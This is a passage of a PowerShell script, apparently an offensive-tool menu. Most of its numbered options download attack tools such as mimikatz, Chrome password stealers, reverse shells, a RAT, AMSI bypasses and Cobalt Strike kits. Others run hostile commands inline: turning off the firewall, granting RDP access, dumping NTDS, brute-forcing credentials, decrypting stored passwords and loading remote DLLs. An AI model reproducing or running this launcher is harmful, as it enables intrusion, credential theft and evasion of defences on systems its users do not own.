        '180' {write-host "you will get https://github.com/PowerShellMafia/PowerSploit/tree/master/Exfiltration"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "PowerShellMafia/PowerSploit/Exfiltration/$FILENAME" "$FILENAME" "PowerShellMafia/PowerSploit/master/Exfiltration/$FILENAME"}}
        '181' {ScaricaExt "gallery.technet.microsoft.com/scriptcenter/PS2EXE-Convert/PS2EXE" "PS2EXE.zip" "https://gallery.technet.microsoft.com/scriptcenter/PS2EXE-Convert-PowerShell-9e4e07f1/file/134627/1/PS2EXE-v0.5.0.0.zip"}
        '182' {ScaricaExt "gallery.technet.microsoft.com/scriptcenter/POWERSHELL-SCRIPT-TO/MemoryDump_PageFile_ConfigurationExtract" "MemoryDump_PageFile_ConfigurationExtract.zip" "https://gallery.technet.microsoft.com/scriptcenter/POWERSHELL-SCRIPT-TO-5e4a7b57/file/204639/2/MemoryDump_PageFile_ConfigurationExtract.zip"}
        '183' {ScaricaExt "gallery.technet.microsoft.com/scriptcenter/Get-MemoryDump" "Get-MemoryDump.ps1" "https://gallery.technet.microsoft.com/scriptcenter/Get-MemoryDump-c5ab38d8/file/73433/1/Get-MemoryDump.ps1"}
        '184' {Scarica "dafthack/PowerMeta" "PowerMeta.ps1" "dafthack/PowerMeta/master/PowerMeta.ps1"}
        '185' {$COMNAME=read-host 'Digit a Computer name or IP address'; if($Cred -ne $null){RemoteServiceObject = Get-WMIObject -Class Win32_Service -Filter "name='RemoteRegistry'" -Credential $Cred -ComputerName $COMNAME}else{RemoteServiceObject = Get-WMIObject -Class Win32_Service -Filter "name='RemoteRegistry'" -ComputerName COMNAME} if($RemoteServiceObject.State -ne 'Running'){$Null = $RemoteServiceObject.StartService()}}
        '186' {Scarica "Zimm/tcpdump-powershell" "PacketCapture.ps1" "Zimm/tcpdump-powershell/master/PacketCapture.ps1"}
        '187' {Scarica "sperner/PowerShell/Sniffer" "Sniffer.ps1" "sperner/PowerShell/master/Sniffer.ps1"}
        '188' {ScaricaExt "gallery.technet.microsoft.com/scriptcenter/Getting-Windows-Defender/Get-AntiMalwareStatus" "Get-AntiMalwareStatus.ps1" "https://gallery.technet.microsoft.com/scriptcenter/Getting-Windows-Defender-d02fa03e/file/224241/1/Get-AntiMalwareStatus.ps1"}
        '189' {write-host "you will get https://github.com/NetSPI/MicroBurst/Az"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "NetSPI/MicroBurst/Az/$FILENAME" "$FILENAME" "NetSPI/MicroBurst/master/Az/$FILENAME"}}
        '190' {write-host "you will get https://github.com/NetSPI/MicroBurst/tree/master/AzureAD"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "NetSPI/MicroBurst/AzureAD/$FILENAME" "$FILENAME" "NetSPI/MicroBurst/master/AzureAD/$FILENAME"}}
        '191' {write-host "you will get https://github.com/NetSPI/MicroBurst/tree/master/AzureRM"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "NetSPI/MicroBurst/AzureRM/$FILENAME" "$FILENAME" "NetSPI/MicroBurst/master/AzureRM/$FILENAME"}}
        '192' {write-host "you will get https://github.com/NetSPI/MicroBurst/tree/master/MSOL"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "NetSPI/MicroBurst/MSOL/$FILENAME" "$FILENAME" "NetSPI/MicroBurst/master/MSOL/$FILENAME"}}
        '193' {write-host "you will get https://github.com/NetSPI/MicroBurst/tree/master/Misc"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "NetSPI/MicroBurst/Misc/$FILENAME" "$FILENAME" "NetSPI/MicroBurst/master/Misc/$FILENAME"}}
        '194' {write-host "you will get https://github.com/NetSPI/MicroBurst/tree/master/REST"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "NetSPI/MicroBurst/REST/$FILENAME" "$FILENAME" "NetSPI/MicroBurst/master/REST/$FILENAME"}}
        '195' {cmd.exe /c 'netsh Advfirewall set allprofiles state off && netsh firewall set opmode disable'}
        '196' {net users; $USRNM=read-host 'Digit an username to add at RDP groups'; if($USRNM -ne ""){net localgroup "Remote Desktop Users" $USRNM /add}}
        '197' {Scarica "HackLikeAPornstar/GibsonBird/applocker-bypas-checker" "applocker-bypas-checker.ps1" "HackLikeAPornstar/GibsonBird/master/chapter4/applocker-bypas-checker.ps1"}
        '198' {$DLL=read-host 'Digit a local dll file'; if($DLL -ne ""){rundll32 shell32.dll,Control_RunDLL $DLL}}
        '199' {write-host "Digit a remote ip and dll file"; $DLL=read-host '(example, \\192.168.0.7\folder\test.dll)'; if($DLL -ne ""){rundll32.exe $DLL,0}}
        '200' {ScaricaSSL "danielbohannon/Invoke-Obfuscation" "Invoke-Obfuscation.zip" "danielbohannon/Invoke-Obfuscation/archive/master.zip"}
        '201' {Scarica "chryzsh/JenkinsPasswordSpray" "JenkinsPasswordSpray.ps1" "chryzsh/JenkinsPasswordSpray/master/JenkinsPasswordSpray.ps1"}
        '202' {ScaricaSSL "adnan-alhomssi/chrome-passwords" "chrome-passwords.exe" "adnan-alhomssi/chrome-passwords/raw/master/bin/chrome-passwords.exe"}
        '203' {ScaricaSSL "haris989/Chrome-password-stealer" "Chrome-password-stealer.exe" "haris989/Chrome-password-stealer/raw/master/main.exe"}
        '204' {ScaricaSSL "kspearrin/ff-password-exporter" "FF-Password-Exporter-Portable-1.2.0.exe" "kspearrin/ff-password-exporter/releases/download/v1.2.0/FF-Password-Exporter-Portable-1.2.0.exe"}
        '205' {$FILENAME=read-host 'Digit a file to read'; if($FILENAME -ne ""){if(Test-Path $FILENAME){$MIO = Get-Content -Path $FILENAME -Raw; $MIO -replace '[^\x20-\x7E]', ''}}}
        '206' {Scarica "nullbind/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner" "Invoke-SqlServer-Escalate-Dbowner.psm1" "nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1"}
        '207' {Scarica "dafthack/HostRecon" "HostRecon.ps1" "dafthack/HostRecon/master/HostRecon.ps1"}
        '208' {ScaricaSSL "S3cur3Th1sSh1t/WinPwn" "WinPwn.zip" "S3cur3Th1sSh1t/WinPwn/archive/master.zip"}
        '209' {Scarica "ivan-sincek/file-shredder" "file_shredder.ps1" "ivan-sincek/file-shredder/master/src/file_shredder.ps1"}
        '210' {Scarica "danielwolfmann/Invoke-WordThief" "Invoke-WordThief.ps1" "danielwolfmann/Invoke-WordThief/master/Invoke-WordThief.ps1"}
        '211' {ScaricaExt "sec-1/gp3finder_v4.0" "gp3finder_v4.0.zip" "http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip"}
        '212' {ScaricaSSL "cyberark/SkyArk" "SkyArk.zip" "cyberark/SkyArk/archive/master.zip"}
        '213' {Scarica "FortyNorthSecurity/WMImplant" "WMImplant.ps1" "FortyNorthSecurity/WMImplant/master/WMImplant.ps1"}
        '214' {$FILE=read-host 'Digit a file to shred'; if($FILE -ne ""){if(Test-Path $FILE){Clear-ItemProperty -Path $FILE -Force -Name Attributes;for ($I=0; $I -le 2; $I++){(get-content -path $FILE)|foreach-object{$_ -replace ".", ((32..127)|get-random -count 1|% {[char]$_})}|set-content -path $FILE}(get-content -path $FILE)|foreach-object{$_ -replace ".", "0"}|set-content -path $FILE}}}
        '215' {write-host "Digit a local port to resirect all other local ports"; $PORT=read-host '(example, 4444 or 9050)'; if($PORT -ne ""){netsh interface portproxy add v4tov4 connectport=$PORT connectaddress=127.0.0.1 listenport=* listenaddress=*}}
        '216' {Scarica "danielbohannon/Invoke-CradleCrafter" "Invoke-CradleCrafter.ps1" "danielbohannon/Invoke-CradleCrafter/master/Invoke-CradleCrafter.ps1"; Scarica "danielbohannon/Invoke-CradleCrafter" "Out-Cradle.ps1" "danielbohannon/Invoke-CradleCrafter/master/Out-Cradle.ps1"}
        '217' {Scarica "dafthack/MailSniper" "MailSniper.ps1" "dafthack/MailSniper/master/MailSniper.ps1"}
        '218' {Scarica "fugawi/EASSniper" "EASSniper.ps1" "fugawi/EASSniper/master/EASSniper.ps1"}
        '219' {ScaricaSSL "curi0usJack/luckystrike" "luckystrike.zip" "curi0usJack/luckystrike/archive/master.zip"}
        '220' {Scarica "johnnyDEP/OWA-Toolkit" "OWA-Toolkit.psm1" "johnnyDEP/OWA-Toolkit/master/OWA-Toolkit.psm1"}
        '221' {Get-NetDomain; write-host "Digit the domain"; $DOMNAME=read-host "(example, domain.topdom)"; if($DOMNAME -ne ""){Get-NetDomain -domain $DOMNAME}; Get-DomainSID; (Get-DomainPolicy)."system access"; Get-NetDomainController; Get-NetUser; write-host "Digit a property name"; $PROP=read-host "(example, pwdlastset)"; if($PROP -ne ""){Get-UserProperty –Properties $PROP}; write-host "Digit a word to search"; $WORD=read-host "(example, pass)"; if($WORD -ne ""){Find-UserField -SearchField Description –SearchTerm $WORD}; Get-NetComputer; Get-NetComputer -Ping; Get-NetGroup; Get-NetGroup *admin*; Get-NetGroupMember -GroupName "Domain Admins"; Invoke-UserHunter; Invoke-UserHunter -CheckAccess; Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs; Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}; Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"; write-host "Digit a Username to get info"; $USERNAME=read-host "(example, admin)"; if($USERNAME -ne ""){Get-NetGroup –UserName $USERNAME; Find-GPOLocation -UserName $USERNAME; Invoke-UserHunter -UserName $USERNAME}; write-host "Digit a Domain, a Computer Name or IP to get info"; $COMNAME=read-host "(example, office-com)"; if($COMNAME -ne ""){Get-NetLocalGroup –ComputerName $COMNAME; Get-NetLoggedon –ComputerName $COMNAME; Get-LastLoggedOn –ComputerName $COMNAME; Get-NetGPO -ComputerName $COMNAME; Find-GPOComputerAdmin –Computername $COMNAME}; Invoke-ShareFinder; Get-NetOU; Get-NetDomainTrust; Get-NetForest; write-host "Digit a ForestName to get info"; $FORESTNAME=read-host "(example, ?)"; if($FORESTNAME -ne ""){Get-NetForest -Forest $FORESTNAME}; Get-NetForestDomain; Get-NetForestCatalog; Get-NetForestTrust; Find-LocalAdminAccess; Invoke-EnumerateLocalAdmin}
        '222' {$DOMNAME=read-host "Digit a domain"; if($DOMNAME -ne ""){setspn -T $DOMNAME -F -Q */*}}
        '223' {Scarica "tmenochet/PowerSpray" "PowerSpray.ps1" "tmenochet/PowerSpray/master/PowerSpray.ps1"}
        '224' {ScaricaSSL "phackt/accesschk-XP" "accesschk-XP.exe" "phackt/pentest/raw/master/privesc/windows/accesschk-XP.exe"}
        '225' {ScaricaExt "sysinternals/accesschk" "accesschk.exe" "https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe"}
        '226' {ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q}
        '227' {write-host "Digit a fullpath file to analyze the stream"; $FLNM=read-host "(example, ./evidence.txt)"; if($FLNM -ne ""){if(test-path $FLNM){get-item -path $FLNM -stream *; write-host "Digit a value inside stream property"; $FLEX=read-host "(example, my.exe)"; if($FLEX -ne ""){if(test-path $FLEX){get-item -path $FLNM -stream $FLEX; write-host "Try to dump ADS content?"; $RSP=read-host "Y/n(default n)"; if($RSP -eq "Y"){get-content -path $FLNM -stream $FLEX}}}}}}
        '228' {ScaricaSSL "0xd4d/dnSpy" "dnSpy.zip" "0xd4d/dnSpy/archive/master.zip"}
        '229' {ScaricaExt "ollydbg.de/odbg110" "odbg110.zip" "http://www.ollydbg.de/odbg110.zip"}
        '230' {ScaricaExt "rada.re/radare2-w32-2.2.0" "radare2-w32-2.2.0.zip" "http://bin.rada.re/radare2-w32-2.2.0.zip"}
        '231' {ScaricaSSL "limbenjamin/nTimetools/nTimestomp_v1.1_x64" "nTimestomp_v1.1_x64.exe" "limbenjamin/nTimetools/raw/master/nTimestomp_v1.1_x64.exe"; ScaricaSSL "limbenjamin/nTimetools/nTimeview_v1.0_x64" "nTimeview_v1.0_x64.exe" "limbenjamin/nTimetools/raw/master/nTimeview_v1.0_x64.exe"}
        '232' {ScaricaBat "hyp3rlinx/DarkFinger-C2-Agent" "DarkFinger-C2-Agent.bat" "hyp3rlinx/DarkFinger-C2/master/DarkFinger-C2-Agent.bat"}
        '233' {Scarica "antonioCoco/Invoke-RunasCs" "Invoke-RunasCs.ps1" "antonioCoco/RunasCs/master/Invoke-RunasCs.ps1"}
        '234' {ScaricaExt "torbrowser/9.5/tor-win64-0.4.3.5" "tor-win64-0.4.3.5.zip" "https://archive.torproject.org/tor-package-archive/torbrowser/9.5/tor-win64-0.4.3.5.zip"}
        '235' {ScaricaExt "torbrowser/9.5/tor-win32-0.4.3.5" "tor-win32-0.4.3.5.zip" "https://archive.torproject.org/tor-package-archive/torbrowser/9.5/tor-win32-0.4.3.5.zip"}
        '236' {ScaricaBat "360-Linton-Lab/WMIHACKER" "WMIHACKER_0.6.vbs" "360-Linton-Lab/WMIHACKER/master/WMIHACKER_0.6.vbs"}
        '237' {ScaricaSSL "gentilkiwi/2.2.0-20200918-fix/mimikatz" "mimikatz-2.2.0-20200918-fix.zip" "gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip"}
        '238' {Scarica "3v4Si0N/HTTP-revshell/Invoke-WebRev" "Invoke-WebRev.ps1" "3v4Si0N/HTTP-revshell/master/Invoke-WebRev.ps1"}
        '239' {Scarica "3v4Si0N/HTTP-revshell/Revshell-Generator" "Revshell-Generator.ps1" "3v4Si0N/HTTP-revshell/master/Revshell-Generator.ps1"}
        '240' {Scarica "besimorhino/powercat" "powercat.ps1" "besimorhino/powercat/master/powercat.ps1"}
        '241' {ScaricaSSL "r00t-3xp10it/meterpeter" "meterpeter.zip" "r00t-3xp10it/meterpeter/archive/master.zip"}
        '242' {Scarica "danielwolfmann/Invoke-WordThief" "Invoke-WordThief.ps1" "danielwolfmann/Invoke-WordThief/master/Invoke-WordThief.ps1"}
        '243' {ScaricaSSL "InfosecMatter/Minimalistic-offensive-security-tools" "Minimalistic-offensive-security-tools.zip" "InfosecMatter/Minimalistic-offensive-security-tools/archive/master.zip"}
        '244' {ScaricaSSL "phackt/Invoke-Recon" "Invoke-Recon.zip" "phackt/Invoke-Recon/archive/master.zip"}
        '245' {Scarica "the-xentropy/xencrypt" "xencrypt.ps1" "the-xentropy/xencrypt/master/xencrypt.ps1"}
        '246' {ScaricaSSL "nccgroup/acCOMplice" "aCOMplice.zip" "nccgroup/acCOMplice/archive/master.zip"}
        '247' {Scarica "JoelGMSec/AutoRDPwn" "AutoRDPwn.ps1" "JoelGMSec/AutoRDPwn/master/AutoRDPwn.ps1"}
        '248' {ScaricaSSL "k8gege/PowerLadon" "Ladon6.6_all.ps1" "k8gege/PowerLadon/raw/master/Ladon6.6_all.ps1"}
        '249' {Scarica "p3nt4/Invoke-SocksProxy" "Invoke-SocksProxy.psm1" "p3nt4/Invoke-SocksProxy/master/Invoke-SocksProxy.psm1"}
        '250' {Scarica "dafthack/MSOLSpray" "MSOLSpray.ps1" "dafthack/MSOLSpray/master/MSOLSpray.ps1"}
        '251' {Scarica "NotMedic/NetNTLMtoSilverTicket" "Get-SpoolStatus.ps1" "NotMedic/NetNTLMtoSilverTicket/master/Get-SpoolStatus.ps1"}
        '252' {ScaricaSSL "BankSecurity/Red_Team" "Red_Team.zip" "BankSecurity/Red_Team/archive/master.zip"}
        '253' {Scarica "cutaway-security/chaps" "chaps-powersploit.ps1" "cutaway-security/chaps/master/chaps-powersploit.ps1"; Scarica "cutaway-security/chaps" "chaps.ps1" "cutaway-security/chaps/master/chaps.ps1"}
        '254' {ScaricaSSL "QAX-A-Team/CobaltStrike-Toolset" "CobaltStrike-Toolset.zip" "QAX-A-Team/CobaltStrike-Toolset/archive/master.zip"}
        '255' {ScaricaSSL "ecstatic-nobel/pOSINT" "pOSINT.zip" "ecstatic-nobel/pOSINT/archive/master.zip"}
        '256' {ScaricaSSL "Kevin-Robertson/Inveigh" "Inveigh.zip" "Kevin-Robertson/Inveigh/archive/master.zip"}
        '257' {ScaricaSSL "scipag/KleptoKitty" "KleptoKitty.zip" "scipag/KleptoKitty/archive/master.zip"}
        '258' {Scarica "scipag/PowerShellUtilities/Invoke-MimikatzNetwork" "Invoke-MimikatzNetwork.ps1" "scipag/PowerShellUtilities/master/Invoke-MimikatzNetwork.ps1"}
        '259' {Scarica "scipag/PowerShellUtilities/Select-MimikatzDomainAccounts" "Select-MimikatzDomainAccounts.ps1" "scipag/PowerShellUtilities/master/Select-MimikatzDomainAccounts.ps1"}
        '260' {Scarica "scipag/PowerShellUtilities/Select-MimikatzLocalAccounts" "Select-MimikatzLocalAccounts.ps1" "scipag/PowerShellUtilities/master/Select-MimikatzLocalAccounts.ps1"}
        '261' {ScaricaSSL "homjxi0e/PowerAvails" "PowerAvails.zip" "homjxi0e/PowerAvails/archive/master.zip"}
        '262' {Scarica "Cybereason/Invoke-WMILM" "Invoke-WMILM.ps1" "Cybereason/Invoke-WMILM/master/Invoke-WMILM.ps1"}
        '263' {Scarica "HarmJ0y/DAMP/Add-RemoteRegBackdoor" "Add-RemoteRegBackdoor.ps1" "HarmJ0y/DAMP/master/Add-RemoteRegBackdoor.ps1"; Scarica "HarmJ0y/DAMP/RemoteHashRetrieval" "RemoteHashRetrieval.ps1" "HarmJ0y/DAMP/master/RemoteHashRetrieval.ps1"}
        '264' {Scarica "phillips321/adaudit" "AdAudit.ps1" "phillips321/adaudit/master/AdAudit.ps1"}
        '265' {Scarica "attactics/Invoke-DCOMPowerPointPivot" "Invoke-DCOMPowerPointPivot.ps1" "attactics/Invoke-DCOMPowerPointPivot/master/Invoke-DCOMPowerPointPivot.ps1"}
        '266' {Scarica "salu90/PSFPT/BruteForce-Basic-Auth" "BruteForce-Basic-Auth.ps1" "salu90/PSFPT/master/BruteForce-Basic-Auth.ps1"}
        '267' {Scarica "salu90/PSFPT/Exfiltrate" "Exfiltrate.ps1" "salu90/PSFPT/master/Exfiltrate.ps1"}
        '268' {Scarica "dafthack/MFASweep" "MFASweep.ps1" "dafthack/MFASweep/master/MFASweep.ps1"}
        '269' {Scarica "p3nt4/Invoke-TmpDavFS" "Invoke-TmpDavFS.psm1" "p3nt4/Invoke-TmpDavFS/master/Invoke-TmpDavFS.psm1"}
        '270' {ScaricaExt "Decompile-Net-code" "Decompile-DotNet.ps1" "https://gallery.technet.microsoft.com/scriptcenter/Decompile-Net-code-in-4581620b/file/134845/1/Decompile-DotNet.ps1"}
        '271' {ScaricaSSL "FuzzySecurity/Capcom-Rootkit/Driver/Capcom" "Capcom.sys" "FuzzySecurity/Capcom-Rootkit/raw/master/Driver/Capcom.sys"}
        '272' {ScaricaSSL "odedshimon/BruteShark" "BruteSharkCli.exe" "odedshimon/BruteShark/releases/download/v1.1.4/BruteSharkCli"}
        '273' {ScaricaSSL "odedshimon/BruteShark/BruteSharkDesktopInstaller_x64" "BruteSharkDesktopInstaller_x64.msi" "odedshimon/BruteShark/releases/download/v1.1.4/BruteSharkDesktopInstaller_x64.msi"}
        '274' {ScaricaSSL "sud0woodo/DCOMrade" "DCOMrade.zip" "sud0woodo/DCOMrade/archive/master.zip"}
        '275' {ScaricaSSL "quasar/Quasar.v1.4.0" "Quasar.v1.4.0.zip" "quasar/Quasar/releases/download/v1.4.0/Quasar.v1.4.0.zip"}
        '276' {$HFILE=read-host "Digit full path file to hash"; if(test-path $HFILE){$HALGO=read-host "Digit an hash algo"; if($HALGO -ne ""){certutil.exe -hashfile $HFILE $HALGO}}}
        '277' {ScaricaSSL "antonioCoco/Mapping-Injection/1.3" "mapping_injection.zip" "antonioCoco/Mapping-Injection/releases/download/1.3/mapping_injection.zip"}
        '278' {ScaricaSSL "ScorpionesLabs/DVS" "DVS.zip" "ScorpionesLabs/DVS/archive/master.zip"}
        '279' {ScaricaSSL "OmerYa/Invisi-Shell/InvisiShellProfiler" "InvisiShellProfiler.dll" "OmerYa/Invisi-Shell/raw/master/build/x64/Release/InvisiShellProfiler.dll"; Scarica "OmerYa/Invisi-Shell/RunWithPathAsAdmin" "RunWithPathAsAdmin.bat" "OmerYa/Invisi-Shell/master/RunWithPathAsAdmin.bat"; Scarica "OmerYa/Invisi-Shell/RunWithRegistryNonAdmin" "RunWithRegistryNonAdmin.bat" "OmerYa/Invisi-Shell/master/RunWithRegistryNonAdmin.bat"}
        '280' {Scarica "lukebaggett/dnscat2-powershell" "dnscat2.ps1" "lukebaggett/dnscat2-powershell/master/dnscat2.ps1"}
        '281' {ScaricaSSL "jaredhaight/PSAttackBuildTool/v1.9.1" "PSAttackBuildTool-v1.9.1.zip" "jaredhaight/PSAttackBuildTool/releases/download/v1.9.1/PSAttackBuildTool-v1.9.1.zip"}
        '282' {$DOMAIN=read-host "Digit a Domain name"; if($DOMAIN -ne ""){$USER=read-host "Digit a wordlist username file path"; if(test-path $USER){$FILE=read-host "Digit a wordlist password file path"; if(test-path $FILE){foreach($TENT in get-content $FILE){ $PASS = convertto-securestring $TENT -asplaintext -force; $CRED = new-object system.management.automation.pscredential('$DOMAIN\$USER',$PASS); try{start-process powershell -credential $CRED}catch{}}}}}}
        '283' {$IP=read-host "Digit an IP target"; if($IP -ne ""){$DOMAIN=read-host "Digit a Domain name"; if($DOMAIN -ne ""){$USER=read-host "Digit a wordlist username file path"; if(test-path $USER){$FILE=read-host "Digit a wordlist password file path"; if(test-path $FILE){foreach($TENT in get-content $FILE){$PW = convertto-securestring -asplaintext -force -string $TENT;	$CRED = new-object -typename system.management.automation.pscredential -argumentlist $DOMAIN\$USER,$PW; enter-pssession -computername $IP -credential $CRED}}}}}}
        '284' {write-host "Digit a specific host or a smb name"; $LHST=read-host "(example, VM1 or empty for all)"; if($LHST -ne ""){Get-SmbShare -Name $LHST | Format-List -Property *}else{Get-SmbShare | Format-List -Property *}}
        '285' {write-host "Digit a specific path with extension"; $EXT=read-host "(example, *.xml)"; if($EXT -ne ""){write-host "Digit a regular expression, use a pipe to search more words"; $RGX=read-host "(example, passws|password)"; if($RGX -ne ""){get-childitem -recurse $EXT|select-string -pattern $RGX}}}
        '286' {Scarica "Viralmaniar/Remote-Desktop-Caching" "rdpcache.ps1" "Viralmaniar/Remote-Desktop-Caching-/master/rdpcache.ps1"}
        '287' {Scarica "AdamDotCom/memcached-on-powershell" "memcached-on-powershell.ps1" "AdamDotCom/memcached-on-powershell/master/memcached-on-powershell.ps1"}
        '288' {ScaricaExt "technet.microsoft/scriptcenter/NLA" "NLA.ps1" "https://gallery.technet.microsoft.com/scriptcenter/Powershell-script-to-9d66257a/file/150221/1/NLA.ps1"}
        '289' {nslookup myip.opendns.com resolver1.opendns.com}
        '290' {ScaricaSSL "bettercap/bettercap" "bettercap_amd64_v2.29.zip" "bettercap/bettercap/releases/download/v2.29/bettercap_windows_amd64_v2.29.zip"}
        '291' {$(Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress}
        '292' {Scarica "Z3R0th-13/Enum" "Enum.ps1" "Z3R0th-13/Enum/master/Enum.ps1"}
        '293' {Scarica "duckingtoniii/Powershell-Domain-User-Enumeration" "User_Enumeration.ps1" "duckingtoniii/Powershell-Domain-User-Enumeration/master/User_Enumeration.ps1"}
        '294' {Scarica "Z3R0th-13/Profit" "Profit.ps1" "Z3R0th-13/Profit/master/Profit.ps1"}
        '295' {ScaricaSSL "Xservus/P0w3rSh3ll" "P0w3rSh3ll.zip" "Xservus/P0w3rSh3ll/archive/master.zip"}
        '296' {Scarica "threatexpress/red-team-scripts/HostEnum" "HostEnum.ps1" "threatexpress/red-team-scripts/master/HostEnum.ps1"}
        '297' {Scarica "silentsignal/wpc-ps/WindowsPrivescCheck" "WindowsPrivescCheck.psm1" "silentsignal/wpc-ps/master/WindowsPrivescCheck/WindowsPrivescCheck.psm1"}
        '298' {ScaricaSSL "pentestmonkey/windows-privesc-check" "windows-privesc-check2.exe" "pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe"}
        '299' {write-host "Digit an IP to get its net infos"; $TIP=read-host "(example, 192.168.1.10)"; if($IP -ne ""){get-netipaddress -ipaddress $TIP | select-object}}
        '300' {write-host "Digit an IP with protocol to get docker version"; $TIP=read-host "(example, http://192.168.1.10)"; if($TIP -ne ""){try{invoke-webrequest -uri $TIP":2376/version"}catch{}}}
        '301' {write-host "Digit a target domain to get users infos via finger"; $TDMN=read-host "(example, example.com)"; if($TDMN -ne ""){finger -l "@$TDMN"}}
        '302' {write-host "Digit a file name of exploit"; $EXPL=read-host "(example, 123)"; if($EXPL -ne ""){ScaricaEDB $EXPL}}
        '303' {Scarica "kmkz/PowerShell/amsi-bypass" "amsi-bypass.ps1" "kmkz/PowerShell/master/amsi-bypass.ps1"}
        '304' {Scarica "kmkz/PowerShell/CLM-bypass" "CLM-bypass.ps1" "kmkz/PowerShell/master/CLM-bypass.ps1"}
        '305' {Scarica "kmkz/PowerShell/ole-payload-generator" "ole-payload-generator.ps1" "kmkz/PowerShell/master/ole-payload-generator.ps1"}
        '306' {Scarica "kmkz/PowerShell/Reverse-Shell" "Reverse-Shell.ps1" "kmkz/PowerShell/master/Reverse-Shell.ps1"}
        '307' {Scarica "nettitude/Invoke-PowerThIEf" "Invoke-PowerThIEf.ps1" "nettitude/Invoke-PowerThIEf/master/Invoke-PowerThIEf.ps1"}
        '308' {Scarica "3gstudent/CLR-Injection_x64" "CLR-Injection_x64.bat" "3gstudent/CLR-Injection/master/CLR-Injection_x64.bat"}
        '309' {Scarica "3gstudent/CLR-Injection_x86" "CLR-Injection_x86.bat" "3gstudent/CLR-Injection/master/CLR-Injection_x86.bat"}
        '310' {Scarica "3gstudent/COM-Object-hijacking" "COM-Object-hijacking-persistence.ps1" "3gstudent/COM-Object-hijacking/master/COM%20Object%20hijacking%20persistence.ps1"}
        '311' {ScaricaSSL "3gstudent/Winpcap_Install" "Winpcap.zip" "3gstudent/Winpcap_Install/archive/master.zip"}
        '312' {Scarica "3gstudent/Dump-Clear-Password-after-KB2871997-installed" "dump.ps1" "3gstudent/Dump-Clear-Password-after-KB2871997-installed/master/dump.ps1"}
        '313' {ScaricaExt "chocolatey" "install.ps1" "https://chocolatey.org/install.ps1"}
        '314' {ScaricaSSL "zyedidia/micro/v2.0.8-win32" "micro-2.0.8-win32.zip" "zyedidia/micro/releases/download/v2.0.8/micro-2.0.8-win32.zip"}
        '315' {ScaricaSSL "zyedidia/micro/v2.0.8-win64" "micro-2.0.8-win64.zip" "zyedidia/micro/releases/download/v2.0.8/micro-2.0.8-win64.zip"}
        '316' {Scarica "canix1/ADACLScanner" "ADACLScan.ps1" "canix1/ADACLScanner/master/ADACLScan.ps1"}
        '317' {ScaricaSSL "cyberark/ACLight" "ACLight.zip" "cyberark/ACLight/archive/master.zip"}
        '318' {Scarica "roggenk/PowerShell/LDAPS" "LDAPS.ps1" "roggenk/PowerShell/master/LDAPS/LDAPS.ps1"}
        '319' {ScaricaExt "microsoft/scriptcenter/GetRegistryKeyLastWriteTimeAndClassName" "GetRegistryKeyLastWriteTimeAndClassName.zip" "https://gallery.technet.microsoft.com/scriptcenter/Get-Last-Write-Time-and-06dcf3fb/file/106244/1/GetRegistryKeyLastWriteTimeAndClassName.zip"}
        '320' {Scarica "wavestone-cdt/powerpxe" "PowerPXE.ps1" "wavestone-cdt/powerpxe/master/PowerPXE.ps1"}
        '321' {write-host "Digit a xml file fullpath"; $XFL=read-host "(example, admin.xml)"; if(test-path $XFL){$XML=Import-CliXml -Path $XFL; $XML.GetNetworkCredential().Password; select-string -pattern "UserName" $XFL; write-host "Digit the username"; $USRN=read-host "(example, admin)"; if($USRN -ne ""){$XML.GetNetworkCredential().$USRN}}}
        '322' {write-host "Digit an IP target"; $TIP=read-host "(example, 192.168.1.188)"; if($TIP -ne ""){write-host "Scanning "$TIP; for($PORT=1; $PORT -le 65536; $PORT++){try{$SOCK=new-object system.net.sockets.tcpclient($TIP, $PORT); if($SOCK.connected){write-host $PORT"`topen"}$SOCK.Close()}catch{}}}}
        '323' {[NtApiDotNet.NtSystemInfo]::CodeIntegrityPolicy}
        '324' {ScaricaExt "sysinternals/AccessChk" "AccessChk.zip" "https://download.sysinternals.com/files/AccessChk.zip"}
        '325' {systeminfo; wmic qfe}
        '326' {Get-ChildItem Env: | ft Key,Value}
        '327' {Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root}
        '328' {whoami /priv}
        '329' {net users; Get-ChildItem C:\Users -Force | select Name; qwinsta}
        '330' {net localgroup}
        '331' {net localgroup Administrators}
        '332' {Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"}
        '333' {Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\; Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\}
        '334' {cmd.exe /c '%SYSTEMROOT%\repair\SAM && %SYSTEMROOT%\System32\config\RegBack\SAM && %SYSTEMROOT%\System32\config\SAM && %SYSTEMROOT%\repair\system && %SYSTEMROOT%\System32\config\SYSTEM && %SYSTEMROOT%\System32\config\RegBack\system'}
        '335' {Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime; Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name}
